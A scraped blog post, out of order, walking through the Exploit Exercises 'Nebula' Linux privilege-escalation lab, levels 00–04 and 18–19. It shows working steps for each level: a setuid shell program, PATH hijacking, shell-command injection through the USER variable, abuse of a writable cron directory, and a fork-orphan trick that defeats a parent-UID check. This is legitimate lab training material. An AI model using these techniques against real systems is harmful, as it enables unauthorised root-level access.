many open files tail: /tmp/log: file truncated Starting up. Verbose level = 3 login egg got [login egg] as input attempting to login logged in successfully (without password file) closelog got [closelog] as input shell /home/flag18/flag18: -d: invalid option Usage: /home/flag18/flag18 [GNU long option] [option] ... /home/flag18/flag18 [GNU long option] [option] script-file ... GNU long options: --debug --debugger --dump-po-strings --dump-strings --help --init-file --login --noediting --noprofile --norc --posix --protected --rcfile --restricted --verbose --version Shell options: -irsD or -c command or -O shopt_option (invocation only) -abefhkmnptuvxBCHP or -o option Examining the error we get now together with the source code, it was clear that the arguments sent to the flag18 binary was also passed to the execve() call. That means that the error is actually sourced from the fact that sh has no -d flag. In fact, one could replicate this error by simply calling sh -d. This called for some more man page reading once again. I realized later that the error may have also been a sort of hint based on the fact that the GNU long options are shown. --rcfile seemed like a good option as it would allow me to specify a type of init script to run. I had a number of attempts to try get this into something workable. Eventually the only file I could get it to load was the logfile I was specifying when running flag18:\nlevel18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv -sh: start_pipeline: pgrp pipe: Too many open files /home/flag18/flag18: invalid option -- '-' /home/flag18/flag18: invalid option -- 'r' /home/flag18/flag18: invalid option -- 'c' /home/flag18/flag18: invalid option -- 'f' /home/flag18/flag18: invalid option -- 'i' /home/flag18/flag18: invalid option -- 'l' /home/flag18/flag18: invalid option -- 'e' tail: /tmp/log: file truncated Starting up. Verbose level = 3 login egg got [login egg] as input attempting to login logged in successfully (without password file) closelog got [closelog] as input shell /tmp/log: line 1: Starting: command not found /tmp/log: line 2: got: command not found /tmp/log: line 3: attempting: command not found /tmp/log: line 4: syntax error near unexpected token `(' /tmp/log: line 4: `logged in successfully (without password file)' The line Starting: command not found was as close as I could get to some form of controlled command execution. So, I created this file, exported it into my PATH and used it to prepare a small SETUID C shell.\nSo, to solve level18:\nlevel18@nebula:~$ vim /var/tmp/Starting level18@nebula:~$ chmod +x /var/tmp/Starting level18@nebula:~$ cat /var/tmp/Starting #!/bin/sh /bin/sh level18@nebula:~$ tail -f /tmp/log \u0026 [1] 7627 level18@nebula:~$ Starting up. Verbose level = 3 got [login egg] as input attempting to login logged in successfully (without password file) got [closelog] as input level18@nebula:~$ export PATH=/var/tmp:$PATH level18@nebula:~$ ulimit -n 4 level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv -sh: start_pipeline: pgrp pipe: Too many open files /home/flag18/flag18: invalid option -- '-' /home/flag18/flag18: invalid option -- 'r' /home/flag18/flag18: invalid option -- 'c' /home/flag18/flag18: invalid option -- 'f' /home/flag18/flag18: invalid option -- 'i' /home/flag18/flag18: invalid option -- 'l' /home/flag18/flag18: invalid option -- 'e' tail: /tmp/log: file truncated Starting up. Verbose level = 3 login egg got [login egg] as input attempting to login logged in successfully (without password file) closelog got [closelog] as input shell sh-4.2$ getflag sh: start_pipeline: pgrp pipe: Too many open files You have successfully executed getflag on a target account level19 Level19’s Description:\n There is a flaw in the below program in how it operates.\n With the description we are provided with the source code of a small C program:\n#include #include #include #include #include #include #include  int main(int argc, char **argv, char **envp) { pid_t pid; char buf[256]; struct stat statbuf; /* Get the parent's /proc entry, so we can verify its user id */ snprintf(buf, sizeof(buf)-1, \"/proc/%d\", getppid()); /* stat() it */ if(stat(buf, \u0026statbuf) == -1) { printf(\"Unable to check parent process\\n\"); exit(EXIT_FAILURE); } /* check the owner id */ if(statbuf.st_uid == 0) { /* If root started us, it is ok to start the shell */ execve(\"/bin/sh\", argv, envp); err(1, \"Unable to execve\"); } printf(\"You are unauthorized to run this program\\n\"); } This one had me completely lost. After studying the functions used, I resorted to getting a hint. Partially reading another walkthrough, I came to the section where it mentions a fork() operation on the flag19 binary. Basically, what it boils down to is the fact that when the process is forked and the parent dies, PID 1 (owned by root) will become the owner causing the checks we have in this binary to fail.\nTo go about this, we would have to write a small C wrapper that will fork itself. We need to give this wrapper a few seconds after the fork to finish off allowing the forked process to become orphaned. Once the process is in the orphaned state, we can execv() the flag19 binary and prepare a shell :)\nSo, to solve level19:\nlevel19@nebula:/var/tmp$ vim pwn19.c level19@nebula:/var/tmp$ cat pwn19.c #include #include int main(void) { pid_t pid = fork(); if (pid == 0) { char *arg[] = { \"/bin/sh\" , \"-c\" , \"gcc /var/tmp/shell.c -o /var/tmp/flag19; chmod 4777 /var/tmp/flag19\" , NULL}; sleep(2); /* Give the fork 2 sec to orphan */ execv(\"/home/flag19/flag19\", arg); printf(\"Done fork\\n\"); return 0; } printf(\"Done parent\\n\"); return 0; } level19@nebula:/var/tmp$ gcc pwn19.c -o pwn19 level19@nebula:/var/tmp$ ./pwn19 Done parent level19@nebula:/var/tmp$ /var/tmp/flag19 sh-4.2$ getflag You have successfully executed getflag on a target account conclusion Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP… ;)\nAs a final touch, my ‘loot’ in /var/tmp after finishing the last level:\n ","wordCount":"9902","inLanguage":"en","datePublished":"2015-05-08T07:18:31Z","dateModified":"2015-05-08T07:18:31Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
playing exploit-exercises - nebula
</h1>
<div class=post-meta>May 8, 2015&nbsp;·&nbsp;47 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2015-05-08-playing-exploit-exercises-nebula.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#introduction aria-label=introduction>introduction</a></li>
<li>
<a href=#setup aria-label=setup>setup</a></li>
<li>
<a href=#level00 aria-label=level00>level00</a></li>
<li>
<a href=#level01 aria-label=level01>level01</a></li>
<li>
<a href=#level02 aria-label=level02>level02</a></li>
<li>
<a href=#level03 aria-label=level03>level03</a></li>
<li>
<a href=#level04 aria-label=level04>level04</a></li>
<li>
<a href=#level05 aria-label=level05>level05</a></li>
<li>
<a href=#level06 aria-label=level06>level06</a></li>
<li>
<a href=#level07 aria-label=level07>level07</a></li>
<li>
<a href=#level08 aria-label=level08>level08</a></li>
<li>
<a href=#level09 aria-label=level09>level09</a><ul>
<li>
<a href=#intermission aria-label=intermission>intermission</a></li></ul>
</li>
<li>
<a href=#level10 aria-label=level10>level10</a></li>
<li>
<a href=#level11 aria-label=level11>level11</a></li>
<li>
<a href=#level12 aria-label=level12>level12</a></li>
<li>
<a href=#level13 aria-label=level13>level13</a></li>
<li>
<a href=#level14 aria-label=level14>level14</a></li>
<li>
<a href=#level15 aria-label=level15>level15</a></li>
<li>
<a href=#level16 aria-label=level16>level16</a></li>
<li>
<a href=#level17 aria-label=level17>level17</a></li>
<li>
<a href=#level18 aria-label=level18>level18</a></li>
<li>
<a href=#level19 aria-label=level19>level19</a></li>
<li>
<a href=#conclusion aria-label=conclusion>conclusion</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=introduction>introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2>
<p>Recently I decided I wanted to have a look at what <a href=https://exploit-exercises.com/>Exploit Exercises</a> had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for <a href=https://exploit-exercises.com/nebula/>Nebula</a>. <em>Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.</em></p>
<figure>
<img loading=lazy src=/images/nebula_logo.png>
</figure>
<p>I did not really have a lot of time on my hands and figured I should start with the &ldquo;easy&rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)</p>
<p>This is the path I took to solve the 20 challenges.</p>
<h2 id=setup>setup<a hidden class=anchor aria-hidden=true href=#setup>#</a></h2>
<p>On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.</p>
<p>After my download finished, I booted the live image, checked the IP address it got assigned using the Nebula account and tried to SSH in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>~ » ssh level00@192.168.217.239
no hostkey alg
</code></pre></div><p><em>sigh</em>. Some quick diagnostics showed that my SSH client was attempting to identify the remote server with a RSA/DSA key, but none was being presented. So, I quickly escalated the <code>nebula</code> account to root and generated a RSA host key with: <code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code> with no password. I was now able to log in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>~ » ssh level00@192.168.217.239
The authenticity of host &#39;192.168.217.239 (192.168.217.239)&#39; can&#39;t be established.
RSA key fingerprint is cf:cf:68:5b:01:05:a8:52:aa:19:aa:54:a8:27:5d:46.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;192.168.217.239&#39; (RSA) to the list of known hosts.

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of &#34;levelXX&#34; and password &#34;levelXX&#34;, where
XX is the level number.

Currently there are 20 levels (00 - 19).


level00@192.168.217.239&#39;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release &#39;12.04 LTS&#39; available.
Run &#39;do-release-upgrade&#39; to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

level00@nebula:~$
</code></pre></div><p>I could see that I was now logged in as level00</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level00@nebula:~$ id
uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>level00<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>level00<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>level00<span style=color:#f92672>)</span>
</code></pre></div><p>The challenges are all in their respective <code>flag</code> folder. So if you are logged in as <code>level00</code>, you are interested in <code>flag00</code>. Once you have exploited whatever needed exploiting and gained the privileges of the respective flag, the command <code>getflag</code> could be run to confirm that you have the correct access. For the most part, I actually wanted to get shells as the users I escalated to, but just running <code>getflag</code> is enough to consider a level done. I had prepared a small C setuid shell in <code>/var/tmp/shell.c</code> with the following output:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>);
    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>This shell was reused throughout the challenges. Lets dig into the challenges themselves.</p>
<h2 id=level00>level00<a hidden class=anchor aria-hidden=true href=#level00>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level00/>Level00&rsquo;s Description</a>:</p>
<blockquote>
<p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>
</blockquote>
<p>Finding SUID binaries is really easy. I guess because this is the format most of the challenges are in, it was a good start to get the challenger to know <em>about</em> SUID binaries :P</p>
<p>So, to solve level00:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level00@nebula:~$ find / -perm -4000 2&gt; /dev/null | xargs ls -lh
-rwsr-x--- <span style=color:#ae81ff>1</span> flag00  level00    7.2K 2011-11-20 21:22 /bin/.../flag00
-rwsr-xr-x <span style=color:#ae81ff>1</span> root    root        26K 2011-05-18 03:12 /bin/fusermount
-rwsr-xr-x <span style=color:#ae81ff>1</span> root    root        87K 2011-08-09 09:15 /bin/mount
-rwsr-xr-x <span style=color:#ae81ff>1</span> root    root        34K 2011-05-03 03:38 /bin/ping
-rwsr-xr-x <span style=color:#ae81ff>1</span> root    root        39K 2011-05-03 03:38 /bin/ping6
-rwsr-xr-x <span style=color:#ae81ff>1</span> root    root        31K 2011-06-24 02:37 /bin/su
-rwsr-xr-x <span style=color:#ae81ff>1</span> root    root        63K 2011-08-09 09:15 /bin/umount
-rwsr-x--- <span style=color:#ae81ff>1</span> flag00  level00    7.2K 2011-11-20 21:22 /rofs/bin/.../flag00
-rwsr-xr-x <span style=color:#ae81ff>1</span> root    root        26K 2011-05-18 03:12 /rofs/bin/fusermount
-rwsr-xr-x <span style=color:#ae81ff>1</span> root    root        87K 2011-08-09 09:15 /rofs/bin/mount
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>

level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!

flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level01>level01<a hidden class=anchor aria-hidden=true href=#level01>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level01/>Level01&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  gid_t gid;
  uid_t uid;
  gid <span style=color:#f92672>=</span> getegid();
  uid <span style=color:#f92672>=</span> geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(<span style=color:#e6db74>&#34;/usr/bin/env echo and now what?&#34;</span>);
}
</code></pre></div><p>We can see a bunch of UID/GID stuff being set with with <code>setresgid</code> and <code>setresuid</code> and then a system command being run with <code>system()</code>. The problem lies in the fact that the command that is being run does not have a full path specified for the <code>echo</code> command. Even though its called with <code>/usr/bin/env</code>, it is possible to modify the current <code>PATH</code> variable and have <code>env</code> report echo as being somewhere other than where it would normally be.</p>
<p>On the filesystem we find the <code>flag01</code> binary and can see it is setuid for <code>flag01</code> user (we are currently logged in as <code>level01</code>):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level01@nebula:~$ cd ~flag01/
level01@nebula:/home/flag01$ ls -lh flag01
-rwsr-x--- <span style=color:#ae81ff>1</span> flag01 level01 7.2K 2011-11-20 21:22 flag01

level01@nebula:/home/flag01$ ./flag01
and now what?
</code></pre></div><p>Abusing this is really easy. I decided to create my own <code>echo</code> binary and modified <code>PATH</code> so that it is called instead of the real <code>echo</code>. A small note here though. The Nebula vm has <code>/tmp</code> mounted with the <code>nosuid</code> option. I see this many times in the real world. What this effectively means is that any suid bit will be ignored for binaries executed on this mount point. Luckily though my second resort being <code>/var/tmp</code> was not mounted separately and I had write access there :)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level01@nebula:/home/flag01$ mount | grep <span style=color:#e6db74>&#34;/tmp&#34;</span>
tmpfs on /tmp type tmpfs <span style=color:#f92672>(</span>rw,nosuid,nodev<span style=color:#f92672>)</span>

level01@nebula:/home/flag01$ ls -lah /var/ | grep tmp
drwxrwxrwt <span style=color:#ae81ff>3</span> root root   <span style=color:#ae81ff>29</span> 2012-08-23 18:46 tmp
</code></pre></div><p>So, to solve level01:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level01@nebula:/home/flag01$ cat /var/tmp/echo
<span style=color:#75715e>#!/bin/sh</span>
gcc /var/tmp/shell.c -o /var/tmp/flag01
chmod <span style=color:#ae81ff>4777</span> /var/tmp/flag01

level01@nebula:/home/flag01$ ls -lh /var/tmp/echo
-rwxrwxr-x <span style=color:#ae81ff>1</span> level01 level01 <span style=color:#ae81ff>77</span> 2015-05-08 07:35 /var/tmp/echo

level01@nebula:/home/flag01$ cat /var/tmp/shell.c
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>

int main<span style=color:#f92672>(</span>void<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    setresuid<span style=color:#f92672>(</span>geteuid<span style=color:#f92672>()</span>, geteuid<span style=color:#f92672>()</span>, geteuid<span style=color:#f92672>())</span>;
    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span><span style=color:#f92672>)</span>;
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>

level01@nebula:/home/flag01$ export PATH<span style=color:#f92672>=</span>/var/tmp:$PATH
level01@nebula:/home/flag01$ ./flag01
level01@nebula:/home/flag01$ ls -lah /var/tmp/flag01
-rwsrwxrwx <span style=color:#ae81ff>1</span> flag01 level01 7.1K 2015-05-08 07:37 /var/tmp/flag01

level01@nebula:/home/flag01$ /var/tmp/flag01
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level02>level02<a hidden class=anchor aria-hidden=true href=#level02>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level02/>Level02&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer;

  gid_t gid;
  uid_t uid;

  gid <span style=color:#f92672>=</span> getegid();
  uid <span style=color:#f92672>=</span> geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer <span style=color:#f92672>=</span> NULL;

  asprintf(<span style=color:#f92672>&amp;</span>buffer, <span style=color:#e6db74>&#34;/bin/echo %s is cool&#34;</span>, getenv(<span style=color:#e6db74>&#34;USER&#34;</span>));
  printf(<span style=color:#e6db74>&#34;about to call system(</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, buffer);

  system(buffer);
}
</code></pre></div><p>Level02 is very similar to Level01, except for that fact that here the line <code>/bin/echo %s is cool</code> is copied to <code>buffer</code> and eventually put through a <code>system()</code> call. The value of the current environment variable <code>USER</code> is added to the command. This is another easy exploit where a simple shell escape will do to get us our own shell. I prepped the shell to echo the word bob, the delimit the command with a ; character and specify the command I want to run. I then end it off with a hash (#) to ignore the rest of the commands that the program has hard coded (<em>is cool</em> in this case).</p>
<p>So, to solve level02:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level02@nebula:/home/flag02$ ./flag02
about to call system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/echo level02 is cool&#34;</span><span style=color:#f92672>)</span>
level02 is cool

level02@nebula:/home/flag02$ USER<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;bob&#34;</span> <span style=color:#f92672>&amp;&amp;</span> ./flag02
about to call system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/echo bob is cool&#34;</span><span style=color:#f92672>)</span>
bob is cool

level02@nebula:/home/flag02$ cat /var/tmp/shell.c
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>

int main<span style=color:#f92672>(</span>void<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    setresuid<span style=color:#f92672>(</span>geteuid<span style=color:#f92672>()</span>, geteuid<span style=color:#f92672>()</span>, geteuid<span style=color:#f92672>())</span>;
    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span><span style=color:#f92672>)</span>;
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>

level02@nebula:/home/flag02$ USER<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;bob; id;#&#34;</span> <span style=color:#f92672>&amp;&amp;</span> ./flag02
about to call system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/echo bob; id;# is cool&#34;</span><span style=color:#f92672>)</span>
bob
uid<span style=color:#f92672>=</span>997<span style=color:#f92672>(</span>flag02<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1003<span style=color:#f92672>(</span>level02<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>997<span style=color:#f92672>(</span>flag02<span style=color:#f92672>)</span>,1003<span style=color:#f92672>(</span>level02<span style=color:#f92672>)</span>

level02@nebula:/home/flag02$ USER<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;#&#34;</span> <span style=color:#f92672>&amp;&amp;</span> ./flag02
about to call system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/echo bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;# is cool&#34;</span><span style=color:#f92672>)</span>
bob

level02@nebula:/home/flag02$ /var/tmp/flag02
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level03>level03<a hidden class=anchor aria-hidden=true href=#level03>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level03/>Level03&rsquo;s Description</a>:</p>
<blockquote>
<p>Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.</p>
</blockquote>
<p>Logging in as <code>level03</code>, we find a directory and a <code>sh</code> script:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level03@nebula:~$ cd ~flag03
level03@nebula:/home/flag03$ ls -lh
total <span style=color:#ae81ff>512</span>
drwxrwxrwx <span style=color:#ae81ff>2</span> flag03 flag03  <span style=color:#ae81ff>3</span> 2012-08-18 05:24 writable.d
-rwxr-xr-x <span style=color:#ae81ff>1</span> flag03 flag03 <span style=color:#ae81ff>98</span> 2011-11-20 21:22 writable.sh

level03@nebula:/home/flag03$ cat writable.sh
<span style=color:#75715e>#!/bin/sh</span>

<span style=color:#66d9ef>for</span> i in /home/flag03/writable.d/* ; <span style=color:#66d9ef>do</span>
    <span style=color:#f92672>(</span>ulimit -t 5; bash -x <span style=color:#e6db74>&#34;</span>$i<span style=color:#e6db74>&#34;</span><span style=color:#f92672>)</span>
    rm -f <span style=color:#e6db74>&#34;</span>$i<span style=color:#e6db74>&#34;</span>
<span style=color:#66d9ef>done</span>
</code></pre></div><p>With the mention of a cronjob, I assumed the <code>writable.sh</code> script was being run. From the source of the script we can see that everything in <code>/home/flag03/writable.d/</code> will have a ulimit set so that processes don’t take more than 5 seconds, and be executed using <code>bash -x</code>. Once done, the file is removed. Easy to exploit.</p>
<p>So, to solve level03:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level03@nebula:/home/flag03$ vim /var/tmp/flag03.sh
level03@nebula:/home/flag03$ cat /var/tmp/flag03.sh
<span style=color:#75715e>#!/bin/sh</span>
gcc /var/tmp/shell.c -o /var/tmp/flag03
chmod <span style=color:#ae81ff>4777</span> /var/tmp/flag03

level03@nebula:/home/flag03$ cat /var/tmp/shell.c
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>

int main<span style=color:#f92672>(</span>void<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    setresuid<span style=color:#f92672>(</span>geteuid<span style=color:#f92672>()</span>, geteuid<span style=color:#f92672>()</span>, geteuid<span style=color:#f92672>())</span>;
    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/sh&#34;</span><span style=color:#f92672>)</span>;
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>

level03@nebula:/home/flag03$ cp /var/tmp/flag03.sh /home/flag03/writable.d/

level03@nebula:/home/flag03$ <span style=color:#75715e># wait some time for the cronjob</span>

level03@nebula:/home/flag03$ /var/tmp/flag03
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level04>level04<a hidden class=anchor aria-hidden=true href=#level04>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level04/>Level04&rsquo;s Description</a>:</p>
<blockquote>
<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
